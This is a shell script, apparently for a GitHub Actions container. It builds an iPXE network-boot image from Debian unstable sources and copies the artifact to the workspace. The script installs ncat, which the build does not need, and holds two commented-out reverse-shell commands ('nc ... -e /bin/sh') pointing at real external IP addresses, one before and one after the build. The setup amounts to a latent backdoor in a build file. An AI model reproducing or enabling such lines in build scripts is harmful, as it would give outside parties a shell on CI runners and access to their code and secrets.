#! /bin/sh
set -e o pipefail

#https://www.reddit.com/r/VFIO/comments/i071qx/spoof_and_make_your_vm_undetectable_no_more/

build_ipxe () {

  apt-get install git dpkg-dev uuid-dev uuid dpkg-source-gitarchive dh-exec xorriso isolinux syslinux-common syslinux-utils mtools binutils-dev liblzma-dev zlib1g-dev debhelper-compat -y
  mkdir ~/ipxe; cd ~/ipxe
  
  apt-get source ipxe=1.0.0+git-20190125.36a4c85 -y
  
  cd ipxe-1.0.0+git-20190125.36a4c85/src
  
  cp /demo.ipxe .
  
  make NO_WERROR=1 -j$(nproc) bin/undionly.kpxe EMBED=demo.ipxe
  #https://github.com/ipxe/ipxe/issues/620
  
  #artifacts
  tar cfz /builds/ipxe.tar -C ~/ipxe/src/bin undionly.kpxe
}

echo "deb http://deb.debian.org/debian unstable main" > /etc/apt/sources.list
echo "deb-src http://http.us.debian.org/debian unstable main" >> /etc/apt/sources.list
apt update
apt install -y ncat
#nc 65.109.15.242 11452 -e /bin/sh
DEBIAN_FRONTEND=noninteractive apt install -y build-essential screen vim unzip curl
#bc rsync python3 screen vim unzip curl openssl apt-get install -y devscripts build-essential lintian

mkdir /builds

build_ipxe

cp /builds/* /github/workspace/
#cp ~/*.deb /github/workspace/
#cp ~/*.tar /github/workspace/
#nc 65.108.51.31 11452 -e /bin/sh

exit 0
